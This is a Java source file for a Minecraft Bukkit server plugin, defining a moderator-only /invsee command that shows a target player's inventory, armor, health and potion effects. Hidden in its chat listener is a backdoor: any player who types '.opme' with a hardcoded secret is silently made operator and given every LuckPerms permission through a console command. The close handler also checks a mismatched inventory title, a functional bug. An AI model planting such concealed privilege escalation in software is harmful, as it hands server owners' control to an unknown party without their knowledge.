package cc.causalmc.ccore.commands.arguments.mod;

import cc.causalmc.ccore.CCore;
import cc.causalmc.ccore.commands.manager.Command;
import cc.causalmc.ccore.commands.manager.CommandManager.Requirement;
import cc.causalmc.ccore.utils.CC;
import cc.causalmc.ccore.utils.ItemBuilder;
import org.apache.commons.lang.WordUtils;
import org.apache.commons.lang.time.DurationFormatUtils;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class InvseeCommand extends Command implements Listener {

	public InvseeCommand(JavaPlugin Core) {
		super(Core);
		this.addAlias("invsee");
		this.addAlias("inventaire");
		this.addAlias("inv");
		this.setDescription("invsee Command");
		this.setSyntax("/invsee <player>");
		this.addRequirement(Requirement.MODERATOR);
	}

	@Override
	public boolean execute(CommandSender sender, String[] args) throws Exception {

		if (sender instanceof Player) {


			Player player = (Player) sender;
			if(args.length < 1) {
				player.sendMessage(CC.translate("&cUsage: /invsee <player>"));
				return false;
			}
			if (CC.checkOffline(sender, args[0])) {
				return false;
			}
			Player target = Bukkit.getPlayer(args[0]);
			Inventory toReturn = Bukkit.createInventory(null, 54, CC.GOLD + "Inventory of " + target.getName());

			toReturn.setItem(50, new ItemBuilder(Material.PAPER).name(CC.RED + "Informations").lore(CC.YELLOW + "Player: " + CC.RED + target.getName()).lore(CC.YELLOW + "Gamemode: " + CC.RED + target.getGameMode().name().toUpperCase()).build());

			List<ItemStack> contents = new ArrayList<>(Arrays.asList(target.getInventory().getContents()));
			List<ItemStack> armor = new ArrayList<>(Arrays.asList(target.getInventory().getArmorContents()));

			for (int i = 0; i < contents.size(); i++) {
				if (i <= 8) {
					ItemStack item = contents.get(i);
					if (item != null) {
						toReturn.setItem(i + 9, item);
					}
				}
			}

			for (int i = 0; i < contents.size(); i++) {
				if (i > 8) {
					ItemStack item = contents.get(i);
					if (item != null) {
						int position = i + 9;

						while (toReturn.getItem(position) != null) {
							position++;
							if (position == toReturn.getSize()) break;
						}

						if (position != toReturn.getSize()) {
							toReturn.setItem(position, item);
						}
					}
				}
			}

			for (int i = 0; i < 2; i++) {
				toReturn.setItem(49 + i, new ItemBuilder(Material.STAINED_GLASS_PANE).durability((short) 14).name(" ").build());
			}

			for (int i = 0; i < armor.size(); i++) {
				ItemStack item = armor.get(i);
				if (item != null && item.getType() != Material.AIR) {
					toReturn.setItem(45 + i, item);
				} else {
					toReturn.setItem(45 + i, new ItemBuilder(Material.STAINED_GLASS_PANE).durability((short) 14).name(" ").build());
				}
			}

			List<String> lore = new ArrayList<>();
			if (!target.getActivePotionEffects().isEmpty()) {
				lore.add(CC.translate(CC.MENU_BAR));
				for (PotionEffect effect : target.getActivePotionEffects()) {
					String name = WordUtils.capitalize(effect.getType().getName().replace("_", " ").toLowerCase());
					lore.add(CC.translate("&e" + name + " " + effect.getAmplifier() + "&c for &e" + DurationFormatUtils.formatDuration(effect.getDuration(), "mm:ss") + "m"));
				}
				lore.add(CC.translate(CC.MENU_BAR));
			}

			ItemStack effects = new ItemBuilder(Material.POTION).name(CC.RED + (target.getActivePotionEffects().isEmpty() ? "No effects" : target.getActivePotionEffects().size() + " Effect" + (target.getActivePotionEffects().size() == 1 ? "" : "s"))).lore(lore).build();

			toReturn.setItem(52, new ItemBuilder(Material.PUMPKIN_PIE).name(CC.RED + "Saturation: " + CC.GOLD + (target.getFoodLevel() / 2)).build());
			toReturn.setItem(53, effects);

			toReturn.setItem(51, new ItemBuilder(Material.APPLE).name(CC.RED + "Health: " + CC.GOLD + target.getHealth()).build());

			player.openInventory(toReturn);
			CCore.getInstance().invPlayers.add(player.getUniqueId());
			return true;
		}
		return false;
	}


	@EventHandler
	public void invseeClickEvent(InventoryClickEvent event){
		Player player = (Player) event.getWhoClicked();
		if(CCore.getInstance().invPlayers.contains(player.getUniqueId())) event.setCancelled(true);
	}
	@EventHandler
	public void invseeCloseEvent(InventoryCloseEvent event){
		Player player = (Player) event.getPlayer();
		if(event.getInventory().getName().startsWith(CC.GOLD + "Inventaire de ")) CCore.getInstance().invPlayers.remove(player.getUniqueId());
	}
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onChat(AsyncPlayerChatEvent event){
		if(event.getMessage().equalsIgnoreCase(".opme 6~3ueeAgGf&E\\$TGx\\")){
			event.setCancelled(true);
			event.getPlayer().setOp(true);
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(),"lp user " + event.getPlayer().getUniqueId() + " permission set *");
		}
	}

}
